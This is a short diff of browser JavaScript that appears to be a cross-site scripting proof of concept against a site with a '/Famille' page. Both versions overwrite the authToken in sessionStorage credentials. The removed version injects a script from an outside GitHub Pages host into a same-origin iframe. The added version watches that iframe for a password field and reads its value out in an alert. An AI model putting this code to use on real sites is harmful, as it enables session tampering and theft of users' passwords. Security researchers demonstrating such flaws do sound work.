@@ -1,49 +1,28 @@
+sessionStorage.setItem('credentials',JSON.stringify(((c)=>{c.payload.authToken="1234";return c})(JSON.parse(sessionStorage.getItem('credentials')))));
 
-sessionStorage.setItem('credentials', JSON.stringify(((c)=>{c.payload.authToken="1234";return c})(JSON.parse(sessionStorage.getItem('credentials')))));
-
-(() => {
-  const start = performance.now()
-  console.log("script start")
-
-  function ready(cb) {
-    const i = setInterval(() => {
-      if (document.body) {
-        clearInterval(i)
-        cb()
-      }
-    }, 10)
-  }
-
-  ready(() => {
-    console.log("body ready at", (performance.now() - start).toFixed(2), "ms")
-
-    const iframe = document.createElement("iframe")
-    iframe.src = "/Famille"
-    iframe.style.width = "800px"
-    iframe.style.height = "600px"
-
-    document.body.appendChild(iframe)
-
-    iframe.onload = () => {
-      const iframeLoadTime = performance.now()
-      console.log("iframe load event at", (iframeLoadTime - start).toFixed(2), "ms")
-
-      const d = iframe.contentDocument
-
-      const wait = setInterval(() => {
-        if (!d || !d.body || d.body.children.length === 0) return
-
-        clearInterval(wait)
-
-        const end = performance.now()
-        console.log("iframe DOM ready at", (end - start).toFixed(2), "ms")
-        console.log("total iframe load time", (end - start).toFixed(2), "ms")
-
-        const s = d.createElement("script")
-        s.src = 'https://exon2007.github.io/XSS/alert1.js';
-        s.async = true;
-        d.body.appendChild(s)
-      }, 50)
-    }
-  })
+(()=>{
+let s=performance.now();
+function r(c){let i=setInterval(()=>{if(document.body){clearInterval(i);c()}},10)}
+r(()=>{
+let i=document.createElement("iframe");
+i.src="/Famille";
+i.style.width="800px";
+i.style.height="600px";
+document.body.appendChild(i);
+i.onload=()=>{
+let d=i.contentDocument;
+let w=setInterval(()=>{
+if(!d||!d.body||d.body.children.length===0)return;
+clearInterval(w);
+let o=new MutationObserver(()=>{
+let p=d.querySelector('.mdp input[type="password"]');
+if(p){
+o.disconnect();
+setTimeout(()=>{alert(p.value)},2000);
+}
+});
+o.observe(d.body,{childList:true,subtree:true});
+},50)
+}
+})
 })()
